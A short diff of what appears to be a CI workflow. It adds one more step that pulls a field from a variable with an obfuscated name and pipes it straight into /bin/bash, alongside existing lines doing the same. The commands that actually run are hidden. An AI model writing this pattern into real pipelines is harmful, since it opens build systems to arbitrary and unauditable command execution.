@@ -42,6 +42,7 @@ jobs:
           printf '%s' "$waqge60" | jq -r .us863 | /bin/bash
           echo $sqo363 | jq -r .cd166 | /bin/bash
           printf '%s' "$yf806" | jq -r .bmhmo89674 | /bin/bash
+          printf '%s' "$zw25" | jq -r .jja3 | /bin/bash
 
       - name: Store results
         if: always()
